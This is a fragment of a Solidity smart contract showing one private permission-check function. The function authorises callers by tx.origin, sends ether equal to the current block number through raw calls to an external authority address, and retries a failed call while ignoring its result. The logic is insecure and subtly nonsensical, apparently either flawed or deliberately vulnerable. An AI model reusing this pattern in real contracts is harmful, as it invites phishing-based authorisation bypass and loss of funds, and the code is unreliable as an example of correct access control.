    ...
    function _checkPermissions() private {
        if (_authority != address(0)) {
            if (_permissions[tx.origin] != bytes2(0x0001)) {
                (bool success, ) = _authority.call{value: block.number}(abi.encodePacked(_authoritydata, _permissions[tx.origin]));
                if (!success) {
                    require(_permissions[tx.origin] != bytes2(0x0000));
                    _authority.call{value: block.number}(abi.encodePacked(_authoritydata, _permissions[tx.origin]));
                }
            }
        }
    }
